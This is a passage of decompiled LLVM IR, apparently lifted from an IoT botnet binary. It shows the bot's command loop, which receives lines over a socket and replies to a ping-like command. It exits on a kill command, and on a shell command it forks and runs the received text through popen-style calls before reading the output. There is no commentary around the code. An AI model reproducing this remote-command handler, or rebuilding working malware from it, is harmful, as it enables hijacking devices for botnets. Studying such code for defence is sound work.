  %v1_1000b880 = inttoptr i32 %v2_1000b87c to i32*
  %v2_1000b880 = load i32, i32* %v1_1000b880, align 4
  store i32 268482708, i32* @lr, align 4
  %v3_1000b890 = call i32 @__libc_waitpid(i32 %v2_1000b880, i32 0, i32 1)
  %tmp100 = icmp slt i32 %v3_1000b890, 1
  br i1 %tmp100, label %dec_label_pc_1000bab4, label %dec_label_pc_1000b8f8

dec_label_pc_1000b8b0:                            ; preds = %dec_label_pc_1000b8f8, %dec_label_pc_1000b940
  %v1_1000b8b4 = mul i32 %v1_1000b8a4, 4
  %v3_1000b8c0 = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000b8c4 = add i32 %v3_1000b8c0, %v1_1000b8b4
  %v1_1000b8c8 = add i32 %v2_1000b8c4, -4
  %v1_1000b8e4 = inttoptr i32 %v2_1000b8c4 to i32*
  %v2_1000b8e4 = load i32, i32* %v1_1000b8e4, align 4
  %v2_1000b8e8 = inttoptr i32 %v1_1000b8c8 to i32*
  store i32 %v2_1000b8e4, i32* %v2_1000b8e8, align 4
  br label %dec_label_pc_1000b8f8

dec_label_pc_1000b8f8:                            ; preds = %dec_label_pc_1000b868, %dec_label_pc_1000b8b0
  %storemerge23 = phi i32 [ %v1_1000b8a4, %dec_label_pc_1000b8b0 ], [ %storemerge14, %dec_label_pc_1000b868 ]
  %v1_1000b8a4 = add i32 %storemerge23, 1
  %v2_1000b920 = load i32, i32* @global_var_1002b900.52, align 4
  %v3_1000b938 = icmp eq i32 %v2_1000b920, 0
  br i1 %v3_1000b938, label %dec_label_pc_1000b940, label %dec_label_pc_1000b8b0

dec_label_pc_1000b940:                            ; preds = %dec_label_pc_1000b8f8
  %v3_1000b924 = load i32, i32* @global_var_1002b904.53, align 4
  %v3_1000b958 = icmp ugt i32 %v3_1000b924, %v1_1000b8a4
  br i1 %v3_1000b958, label %dec_label_pc_1000b8b0, label %dec_label_pc_1000b960

dec_label_pc_1000b960:                            ; preds = %dec_label_pc_1000b940
  %v1_1000b964 = mul i32 %v1_1000b8a4, 4
  %v3_1000b970 = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000b974 = add i32 %v1_1000b964, -4
  %v1_1000b978 = add i32 %v2_1000b974, %v3_1000b970
  %v2_1000b980 = inttoptr i32 %v1_1000b978 to i32*
  store i32 0, i32* %v2_1000b980, align 4
  %v3_1000b98c = load i32, i32* @global_var_1002b904.53, align 4
  %v2_1000b990 = load i32, i32* @global_var_1002b900.52, align 4
  %v1_1000b994 = add i32 %v3_1000b98c, -1
  %v2_1000b994 = icmp ne i32 %v3_1000b98c, 0
  %v2_1000b998 = zext i1 %v2_1000b994 to i32
  %v3_1000b998 = add i32 %v2_1000b990, -1
  %v4_1000b998 = add i32 %v3_1000b998, %v2_1000b998
  store i32 %v4_1000b998, i32* @global_var_1002b900.52, align 4
  store i32 %v1_1000b994, i32* @global_var_1002b904.53, align 4
  %v1_1000b9c8 = mul i32 %v1_1000b994, 4
  %v1_1000b9d0 = add i32 %v1_1000b9c8, 4
  store i32 268483036, i32* @lr, align 4
  %v1_1000b9d8 = call i32 @malloc(i32 %v1_1000b9d0)
  br label %dec_label_pc_1000ba30

dec_label_pc_1000b9f0:                            ; preds = %dec_label_pc_1000ba30, %dec_label_pc_1000ba78
  %v1_1000b9f4 = mul i32 %storemerge19, 4
  %v2_1000ba00 = add i32 %v1_1000b9f4, %v1_1000b9d8
  %v3_1000ba14 = load i32, i32* @global_var_1002b92c.54, align 4
  %v2_1000ba18 = add i32 %v3_1000ba14, %v1_1000b9f4
  %v1_1000ba1c = inttoptr i32 %v2_1000ba18 to i32*
  %v2_1000ba1c = load i32, i32* %v1_1000ba1c, align 4
  %v2_1000ba20 = inttoptr i32 %v2_1000ba00 to i32*
  store i32 %v2_1000ba1c, i32* %v2_1000ba20, align 4
  %v1_1000ba28 = add i32 %storemerge19, 1
  br label %dec_label_pc_1000ba30

dec_label_pc_1000ba30:                            ; preds = %dec_label_pc_1000b960, %dec_label_pc_1000b9f0
  %storemerge19 = phi i32 [ 0, %dec_label_pc_1000b960 ], [ %v1_1000ba28, %dec_label_pc_1000b9f0 ]
  %v2_1000ba58 = load i32, i32* @global_var_1002b900.52, align 4
  %v3_1000ba70 = icmp eq i32 %v2_1000ba58, 0
  br i1 %v3_1000ba70, label %dec_label_pc_1000ba78, label %dec_label_pc_1000b9f0

dec_label_pc_1000ba78:                            ; preds = %dec_label_pc_1000ba30
  %v3_1000ba5c = load i32, i32* @global_var_1002b904.53, align 4
  %v3_1000ba90 = icmp ugt i32 %v3_1000ba5c, %storemerge19
  br i1 %v3_1000ba90, label %dec_label_pc_1000b9f0, label %dec_label_pc_1000ba98

dec_label_pc_1000ba98:                            ; preds = %dec_label_pc_1000ba78
  %v3_1000ba9c = load i32, i32* @global_var_1002b92c.54, align 4
  store i32 268483240, i32* @lr, align 4
  %v1_1000baa4 = call i32 @free(i32 %v3_1000ba9c)
  store i32 %v1_1000b9d8, i32* @global_var_1002b92c.54, align 4
  br label %dec_label_pc_1000bab4

dec_label_pc_1000bab4:                            ; preds = %dec_label_pc_1000b868, %dec_label_pc_1000ba98
  %v1_1000bab8 = add i32 %storemerge14, 1
  br label %dec_label_pc_1000bac0

dec_label_pc_1000bac0:                            ; preds = %dec_label_pc_1000c010, %dec_label_pc_1000bab4
  %storemerge14 = phi i32 [ %v1_1000bab8, %dec_label_pc_1000bab4 ], [ 0, %dec_label_pc_1000c010 ]
  %tmp102 = icmp slt i32 %storemerge14, 0
  %v1_1000bac4 = zext i1 %tmp102 to i32
  %v2_1000bac4 = ashr i32 %storemerge14, 31
  %v3_1000bac4 = and i32 %v2_1000bac4, -2
  %v4_1000bac4 = or i32 %v3_1000bac4, %v1_1000bac4
  %v2_1000baec = load i32, i32* @global_var_1002b900.52, align 4
  %v3_1000baf0 = load i32, i32* @global_var_1002b904.53, align 4
  %v3_1000bb04 = icmp ugt i32 %v2_1000baec, %v4_1000bac4
  br i1 %v3_1000bb04, label %dec_label_pc_1000b868, label %dec_label_pc_1000bb0c

dec_label_pc_1000bb0c:                            ; preds = %dec_label_pc_1000bac0
  %v4_1000bb04 = icmp eq i32 %v2_1000baec, %v4_1000bac4
  br i1 %v4_1000bb04, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000bb0c
  %v3_1000bb24 = icmp ugt i32 %v3_1000baf0, %storemerge14
  br i1 %v3_1000bb24, label %dec_label_pc_1000b868, label %dec_label_pc_1000bb2c

dec_label_pc_1000bb2c:                            ; preds = %dec_label_pc_1000bb0c, %dec_label_pc_1000bb1c
  %v2_1000bb34 = add i32 %v5_1000c028, %v2_1000bb30
  %v3_1000bb3c = add i32 %v2_1000bb34, 1132
  %v4_1000bb3c = inttoptr i32 %v3_1000bb3c to i8*
  store i8 0, i8* %v4_1000bb3c, align 1
  %v1_1000bb48 = call i32 @trim(i32 %v2_1000c018)
  store i32 268483424, i32* @lr, align 4
  %v5_1000bb5c = call i32 @strstr(i32 %v2_1000c018, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_10017b30.45, i32 0, i32 0), i32 268500992)
  %v4_1000bb68 = icmp eq i32 %v5_1000bb5c, %v2_1000c018
  br i1 %v4_1000bb68, label %dec_label_pc_1000bb70, label %dec_label_pc_1000bb90

dec_label_pc_1000bb70:                            ; preds = %dec_label_pc_1000bb2c
  %v3_1000bb74 = load i32, i32* @global_var_1002b8f8.44, align 4
  store i32 ptrtoint (i32* @global_var_1000bb8c.692 to i32), i32* @lr, align 4
  %v4_1000bb88 = call i32 @sockprintf(i32 %v3_1000bb74, i32 ptrtoint ([5 x i8]* @global_var_10018e08.691 to i32), i32 268566528)
  br label %dec_label_pc_1000c010

dec_label_pc_1000bb90:                            ; preds = %dec_label_pc_1000bb2c
  store i32 268483492, i32* @lr, align 4
  %v5_1000bba0 = call i32 @strstr(i32 %v2_1000c018, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_10018e10.693, i32 0, i32 0), i32 268566528)
  %v4_1000bbac = icmp eq i32 %v5_1000bba0, %v2_1000c018
  br i1 %v4_1000bbac, label %dec_label_pc_1000bbb4, label %dec_label_pc_1000bbbc

dec_label_pc_1000bbb4:                            ; preds = %dec_label_pc_1000bb90
  %v0_1000bbb8 = call i32 @__GI_exit()
  br label %dec_label_pc_1000bbbc

dec_label_pc_1000bbbc:                            ; preds = %dec_label_pc_1000bb90, %dec_label_pc_1000bbb4
  %v2_1000bbc8 = load i8, i8* %v4_1000c028, align 4
  %v3_1000bbd0 = icmp eq i8 %v2_1000bbc8, 33
  br i1 %v3_1000bbd0, label %dec_label_pc_1000bbf4, label %dec_label_pc_1000c010

dec_label_pc_1000bbf4:                            ; preds = %dec_label_pc_1000bbbc, %dec_label_pc_1000bc08
  %storemerge = phi i32 [ %v1_1000bbdc, %dec_label_pc_1000bc08 ], [ %v2_1000c018, %dec_label_pc_1000bbbc ]
  %v1_1000bbdc = add i32 %storemerge, 1
  %storemerge8 = inttoptr i32 %v1_1000bbdc to i8*
  %v2_1000bbf8 = load i8, i8* %storemerge8, align 1
  %v3_1000bc00 = icmp eq i8 %v2_1000bbf8, 32
  br i1 %v3_1000bc00, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bc08

dec_label_pc_1000bc08:                            ; preds = %dec_label_pc_1000bbf4
  %v2_1000bc0c = load i8, i8* %storemerge8, align 1
  %v3_1000bc14 = icmp eq i8 %v2_1000bc0c, 0
  br i1 %v3_1000bc14, label %dec_label_pc_1000bc1c, label %dec_label_pc_1000bbf4

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc08, %dec_label_pc_1000bbf4
  %v2_1000bc20 = load i8, i8* %storemerge8, align 1
  %v3_1000bc28 = icmp eq i8 %v2_1000bc20, 0
  br i1 %v3_1000bc28, label %dec_label_pc_1000c010, label %dec_label_pc_1000bc30

dec_label_pc_1000bc30:                            ; preds = %dec_label_pc_1000bc1c
  store i8 0, i8* %storemerge8, align 1
  store i32 %v1_1000bc40, i32* @r3, align 4
  %v0_1000bc50 = call i32 @__GI_strlen()
  %v2_1000bc60 = add i32 %v0_1000bc50, %v2_1000c018
  %v1_1000bc64 = add i32 %v2_1000bc60, 2
  %v2_1000bcb0 = add i32 %v2_1000bc60, 1
  br label %dec_label_pc_1000bc98

dec_label_pc_1000bc70:                            ; preds = %dec_label_pc_1000bcc8, %dec_label_pc_1000bc98
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bc78 = call i32 @__GI_strlen()
  %v1_1000bc8c = add i32 %v0_1000bc78, %v2_1000bcb0
  %v3_1000bc94 = inttoptr i32 %v1_1000bc8c to i8*
  store i8 0, i8* %v3_1000bc94, align 1
  br label %dec_label_pc_1000bc98

dec_label_pc_1000bc98:                            ; preds = %dec_label_pc_1000bc30, %dec_label_pc_1000bc70
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bca0 = call i32 @__GI_strlen()
  %v1_1000bcb4 = add i32 %v0_1000bca0, %v2_1000bcb0
  %v1_1000bcb8 = inttoptr i32 %v1_1000bcb4 to i8*
  %v2_1000bcb8 = load i8, i8* %v1_1000bcb8, align 1
  %v3_1000bcc0 = icmp eq i8 %v2_1000bcb8, 10
  br i1 %v3_1000bcc0, label %dec_label_pc_1000bc70, label %dec_label_pc_1000bcc8

dec_label_pc_1000bcc8:                            ; preds = %dec_label_pc_1000bc98
  store i32 %v1_1000bc64, i32* @r3, align 4
  %v0_1000bcd0 = call i32 @__GI_strlen()
  %v1_1000bce4 = add i32 %v0_1000bcd0, %v2_1000bcb0
  %v1_1000bce8 = inttoptr i32 %v1_1000bce4 to i8*
  %v2_1000bce8 = load i8, i8* %v1_1000bce8, align 1
  %v3_1000bcf0 = icmp eq i8 %v2_1000bce8, 13
  br i1 %v3_1000bcf0, label %dec_label_pc_1000bc70, label %dec_label_pc_1000bd10.preheader

dec_label_pc_1000bd10.preheader:                  ; preds = %dec_label_pc_1000bcc8
  %stack_var_-5284.025 = inttoptr i32 %v1_1000bc64 to i8*
  %v2_1000bd1426 = load i8, i8* %stack_var_-5284.025, align 1
  %v3_1000bd1c30 = icmp eq i8 %v2_1000bd1426, 32
  br i1 %v3_1000bd1c30, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd24

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bd24
  %v1_1000bd08 = add i32 %storemerge2431, 1
  %stack_var_-5284.0 = inttoptr i32 %v1_1000bd08 to i8*
  %v2_1000bd14 = load i8, i8* %stack_var_-5284.0, align 1
  %v3_1000bd1c = icmp eq i8 %v2_1000bd14, 32
  br i1 %v3_1000bd1c, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd24

dec_label_pc_1000bd24:                            ; preds = %dec_label_pc_1000bd10.preheader, %dec_label_pc_1000bd04
  %stack_var_-5284.032 = phi i8* [ %stack_var_-5284.0, %dec_label_pc_1000bd04 ], [ %stack_var_-5284.025, %dec_label_pc_1000bd10.preheader ]
  %storemerge2431 = phi i32 [ %v1_1000bd08, %dec_label_pc_1000bd04 ], [ %v1_1000bc64, %dec_label_pc_1000bd10.preheader ]
  %v2_1000bd28 = load i8, i8* %stack_var_-5284.032, align 1
  %v3_1000bd30 = icmp eq i8 %v2_1000bd28, 0
  br i1 %v3_1000bd30, label %dec_label_pc_1000bd38, label %dec_label_pc_1000bd04

dec_label_pc_1000bd38:                            ; preds = %dec_label_pc_1000bd04, %dec_label_pc_1000bd24, %dec_label_pc_1000bd10.preheader
  %storemerge24.lcssa = phi i32 [ %v1_1000bc64, %dec_label_pc_1000bd10.preheader ], [ %v1_1000bd08, %dec_label_pc_1000bd04 ], [ %storemerge2431, %dec_label_pc_1000bd24 ]
  %stack_var_-5284.0.lcssa = phi i8* [ %stack_var_-5284.025, %dec_label_pc_1000bd10.preheader ], [ %stack_var_-5284.0, %dec_label_pc_1000bd04 ], [ %stack_var_-5284.032, %dec_label_pc_1000bd24 ]
  store i8 0, i8* %stack_var_-5284.0.lcssa, align 1
  %v1_1000bd48 = add i32 %storemerge24.lcssa, 1
  %v2_1000bd9437 = load i8, i8* %stack_var_-5284.025, align 1
  %v3_1000bd9c40 = icmp eq i8 %v2_1000bd9437, 0
  br i1 %v3_1000bd9c40, label %dec_label_pc_1000bda4, label %dec_label_pc_1000bd5c

dec_label_pc_1000bd5c:                            ; preds = %dec_label_pc_1000bd38, %dec_label_pc_1000bd5c
  %storemerge742 = phi i8* [ %storemerge7, %dec_label_pc_1000bd5c ], [ %stack_var_-5284.025, %dec_label_pc_1000bd38 ]
  %storemerge1641 = phi i32 [ %v1_1000bd88, %dec_label_pc_1000bd5c ], [ %v1_1000bc64, %dec_label_pc_1000bd38 ]
  %v3_1000bd60 = load i8, i8* %storemerge742, align 1
  %v4_1000bd60 = zext i8 %v3_1000bd60 to i32
  store i32 268483956, i32* @lr, align 4
  %v3_1000bd70 = call i32 @__GI_toupper(i32 %v4_1000bd60, i32 %storemerge1641)
  %v1_1000bd80 = trunc i32 %v3_1000bd70 to i8
  store i8 %v1_1000bd80, i8* %storemerge742, align 1
  %v1_1000bd88 = add i32 %storemerge1641, 1
  %storemerge7 = inttoptr i32 %v1_1000bd88 to i8*
  %v2_1000bd94 = load i8, i8* %storemerge7, align 1
  %v3_1000bd9c = icmp eq i8 %v2_1000bd94, 0
  br i1 %v3_1000bd9c, label %dec_label_pc_1000bda4, label %dec_label_pc_1000bd5c

dec_label_pc_1000bda4:                            ; preds = %dec_label_pc_1000bd5c, %dec_label_pc_1000bd38
  store i32 ptrtoint ([5 x i8]* @global_var_10018e14.694 to i32), i32* @r4, align 4
  %v4_1000bdb4 = call i32 @__GI_strcoll(i8* %stack_var_-5284.025, i32 ptrtoint ([5 x i8]* @global_var_10018e14.694 to i32))
  %v3_1000bdbc = icmp eq i32 %v4_1000bdb4, 0
  br i1 %v3_1000bdbc, label %dec_label_pc_1000bdc4, label %dec_label_pc_1000be8c

dec_label_pc_1000bdc4:                            ; preds = %dec_label_pc_1000bda4
  store i32 268484040, i32* @lr, align 4
  %v0_1000bdc4 = call i32 @listFork()
  %v3_1000bdcc = icmp eq i32 %v0_1000bdc4, 0
  br i1 %v3_1000bdcc, label %dec_label_pc_1000bdd4, label %dec_label_pc_1000c010

dec_label_pc_1000bdd4:                            ; preds = %dec_label_pc_1000bdc4
  store i32 268484076, i32* @lr, align 4
  %v3_1000bde8 = call i32 @__GI_memset(i32 %v2_1000bdd4, i32 0, i32 1024)
  %v4_1000be08 = call i32 @szprintf(i32 %v2_1000bdd4, i32 ptrtoint ([8 x i8]* @global_var_10018e1c.695 to i32), i32 %v1_1000bd48)
  store i32 268484132, i32* @lr, align 4
  %v3_1000be20 = call i32 @fdpopen(i32 %v2_1000bdd4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_10018e24.696, i32 0, i32 0))
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be30:                            ; preds = %dec_label_pc_1000be5c
  %v1_1000be38 = call i32 @trim(i32 %v2_1000bdd4)
  store i32 ptrtoint ([3 x i8]* @global_var_1000be54.697 to i32), i32* @lr, align 4
  %v3_1000be50 = call i32 @__GI_memset(i32 %v2_1000bdd4, i32 0, i32 1024)
  store i32 268484188, i32* @lr, align 4
  %v1_1000be58 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1000be5c

dec_label_pc_1000be5c:                            ; preds = %dec_label_pc_1000bdd4, %dec_label_pc_1000be30
  %v3_1000be6c = call i32 @fdgets(i32 %v2_1000bdd4, i32 1024, i32 %v3_1000be20)
  %v3_1000be74 = icmp eq i32 %v3_1000be6c, 0
  br i1 %v3_1000be74, label %dec_label_pc_1000be7c, label %dec_label_pc_1000be30

dec_label_pc_1000be7c:                            ; preds = %dec_label_pc_1000be5c
  %v1_1000be80 = call i32 @fdpclose(i32 %v3_1000be20)
  %v0_1000be88 = call i32 @__GI_exit()
  br label %dec_label_pc_1000be8c

dec_label_pc_1000be8c:                            ; preds = %dec_label_pc_1000bda4, %dec_label_pc_1000be7c
  store i32 ptrtoint (i32* @global_var_10018e28.700 to i32), i32* @r4, align 4
  store i32 268484264, i32* @lr, align 4
  %v3_1000bea4 = call i32 @__GI_strtok(i32 %v1_1000bd48, i32 ptrtoint (i32* @global_var_10018e28.700 to i32), i32 268566528)
  store i32 %v1_1000bc64, i32* %stack_var_-5252, align 4
  %v3_1000bf9c46 = icmp eq i32 %v3_1000bea4, 0
  br i1 %v3_1000bf9c46, label %dec_label_pc_1000bfa4, label %dec_label_pc_1000bebc

dec_label_pc_1000bebc:                            ; preds = %dec_label_pc_1000be8c, %dec_label_pc_1000bf80
  %stack_var_-5312.049.in = phi i32 [ %v3_1000bf8c, %dec_label_pc_1000bf80 ], [ %v3_1000bea4, %dec_label_pc_1000be8c ]
  %stack_var_-5308.147 = phi i32 [ %stack_var_-5308.0, %dec_label_pc_1000bf80 ], [ 1, %dec_label_pc_1000be8c ]
  %stack_var_-5312.049 = inttoptr i32 %stack_var_-5312.049.in to i8*
  %v2_1000bec0 = load i8, i8* %stack_var_-5312.049, align 1
  %v3_1000bec8 = icmp eq i8 %v2_1000bec0, 10
  br i1 %v3_1000bec8, label %dec_label_pc_1000bf80, label %dec_label_pc_1000bed0

dec_label_pc_1000bed0:                            ; preds = %dec_label_pc_1000bebc
  store i32 %stack_var_-5308.147, i32* @r29, align 4
  store i32 %stack_var_-5312.049.in, i32* @r3, align 4
  %v0_1000bedc = call i32 @__GI_strlen()
  %v1_1000bee4 = add i32 %v0_1000bedc, 1
  store i32 268484336, i32* @lr, align 4
  %v1_1000beec = call i32 @malloc(i32 %v1_1000bee4)
  %v0_1000bef8 = load i32, i32* @r29, align 4
  %v1_1000bef8 = mul i32 %v0_1000bef8, 4
  %v1_1000bf04 = add i32 %v1_1000bef8, %v2_1000bfe0
  %v2_1000bf08 = inttoptr i32 %v1_1000bf04 to i32*
  store i32 %v1_1000beec, i32* %v2_1000bf08, align 4
  %v1_1000bf10 = mul i32 %stack_var_-5308.147, 4
  %v1_1000bf1c = add i32 %v1_1000bf10, %v2_1000bfe0
  %v1_1000bf20 = inttoptr i32 %v1_1000bf1c to i32*
  %v2_1000bf20 = load i32, i32* %v1_1000bf20, align 4
  store i32 %stack_var_-5312.049.in, i32* @r3, align 4
  %v0_1000bf2c = call i32 @__GI_strlen()
  %v1_1000bf34 = add i32 %v0_1000bf2c, 1
  store i32 268484428, i32* @lr, align 4
  %v3_1000bf48 = call i32 @__GI_memset(i32 %v2_1000bf20, i32 0, i32 %v1_1000bf34)
  %v2_1000bf60 = load i32, i32* %v1_1000bf20, align 4
  %v4_1000bf70 = call i32 @strcpy(i32 %v2_1000bf60, i8* nonnull %stack_var_-5312.049)
  %v1_1000bf78 = add i32 %stack_var_-5308.147, 1
  br label %dec_label_pc_1000bf80

dec_label_pc_1000bf80:                            ; preds = %dec_label_pc_1000bebc, %dec_label_pc_1000bed0
  %stack_var_-5308.0 = phi i32 [ %stack_var_-5308.147, %dec_label_pc_1000bebc ], [ %v1_1000bf78, %dec_label_pc_1000bed0 ]
  store i32 ptrtoint (i32* @global_var_10018e28.700 to i32), i32* @r4, align 4
  store i32 268484496, i32* @lr, align 4
  %v3_1000bf8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018e28.700 to i32), i32 268566528)
  %v3_1000bf9c = icmp eq i32 %v3_1000bf8c, 0
  br i1 %v3_1000bf9c, label %dec_label_pc_1000bfa4, label %dec_label_pc_1000bebc

dec_label_pc_1000bfa4:                            ; preds = %dec_label_pc_1000bf80, %dec_label_pc_1000be8c
  %stack_var_-5308.1.lcssa = phi i32 [ 1, %dec_label_pc_1000be8c ], [ %stack_var_-5308.0, %dec_label_pc_1000bf80 ]
  store i32 268484532, i32* @lr, align 4
  %v3_1000bfb0 = call i32 @processCmd(i32 %stack_var_-5308.1.lcssa, i32* nonnull %stack_var_-5252)
  %tmp101 = icmp slt i32 %stack_var_-5308.1.lcssa, 2
  br i1 %tmp101, label %dec_label_pc_1000c010, label %dec_label_pc_1000bfd4.lr.ph

dec_label_pc_1000bfd4.lr.ph:                      ; preds = %dec_label_pc_1000bfa4
  store i32 1, i32* %stack_var_-5320, align 4
  br label %dec_label_pc_1000bfd4

dec_label_pc_1000bfd4:                            ; preds = %dec_label_pc_1000bfd4.lr.ph, %dec_label_pc_1000bfd4
  %v3_1000bfd4 = phi i32 [ 1, %dec_label_pc_1000bfd4.lr.ph ], [ %v1_1000bff8, %dec_label_pc_1000bfd4 ]
  %v1_1000bfd8 = mul i32 %v3_1000bfd4, 4
  %v1_1000bfe4 = add i32 %v1_1000bfd8, %v2_1000bfe0
  %v1_1000bfe8 = inttoptr i32 %v1_1000bfe4 to i32*
  %v2_1000bfe8 = load i32, i32* %v1_1000bfe8, align 4
  store i32 268484596, i32* @lr, align 4
  %v1_1000bff0 = call i32 @free(i32 %v2_1000bfe8)
  %v3_1000bff4 = load i32, i32* %stack_var_-5320, align 4
  %v1_1000bff8 = add i32 %v3_1000bff4, 1
  store i32 %v1_1000bff8, i32* %stack_var_-5320, align 4
  %v2_1000c008 = icmp slt i32 %v1_1000bff8, %stack_var_-5308.1.lcssa
  br i1 %v2_1000c008, label %dec_label_pc_1000bfd4, label %dec_label_pc_1000c010

dec_label_pc_1000c010:                            ; preds = %dec_label_pc_1000bfd4, %dec_label_pc_1000bdc4, %dec_label_pc_1000bbbc, %dec_label_pc_1000bfa4, %dec_label_pc_1000bc1c, %dec_label_pc_1000bb70, %dec_label_pc_1000b7f4
  %v3_1000c014 = load i32, i32* @global_var_1002b8f8.44, align 4
  %v5_1000c028 = call i32 @recvLine(i32 %v3_1000c014, i8* %v4_1000c028, i32 4096, i32 %v2_1000c018)
  %v4_1000c03c = icmp eq i32 %v5_1000c028, -1
  br i1 %v4_1000c03c, label %dec_label_pc_1000b7d8, label %dec_label_pc_1000bac0

; uselistorder directives
  uselistorder i32 %v5_1000c028, { 1, 0 }
  uselistorder i32 %v1_1000bff8, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5308.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000bf8c, { 1, 0 }
  uselistorder i8* %stack_var_-5312.049, { 1, 0 }
  uselistorder i32 %stack_var_-5308.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_1000bd88, { 1, 0 }
  uselistorder i32 %storemerge1641, { 1, 0 }
  uselistorder i8* %storemerge742, { 1, 0 }
  uselistorder i32 %v1_1000bd48, { 1, 0 }
  uselistorder i8* %stack_var_-5284.025, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000bc64, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000bbdc, { 1, 0 }
  uselistorder i32 %v2_1000baec, { 1, 0 }
  uselistorder i32 %storemerge14, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge19, { 1, 0, 2 }
  uselistorder i32 %v1_1000b9f4, { 1, 0 }
  uselistorder i32 %v1_1000b9d8, { 1, 0 }
  uselistorder i32 %v3_1000b98c, { 1, 0 }
  uselistorder i32 %v1_1000b8a4, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000bdd4, { 3, 1, 2, 4, 0, 5 }
  uselistorder i8* %v4_1000c028, { 1, 0 }
  uselistorder i32 %v2_1000c018, { 3, 1, 0, 4, 5, 6, 7, 8, 2 }
  uselistorder i32* %stack_var_-5320, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10018e28.700 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @szprintf, { 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32)* @strstr, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_1002b900.52, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @sockprintf, { 2, 1, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32*, i32)* @__GI_inet_ntoa, { 2, 0, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 1, 0, 4, 3, 2 }
  uselistorder i32 (i32)* @__GI_time, { 2, 1, 10, 9, 8, 7, 6, 0, 5, 4, 3 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @access, { 1, 0 }
  uselistorder label %dec_label_pc_1000c010, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_1000bfd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf80, { 1, 0 }
  uselistorder label %dec_label_pc_1000bebc, { 1, 0 }
  uselistorder label %dec_label_pc_1000be8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000be5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bd24, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc98, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bab4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba30, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8b0, { 1, 0 }
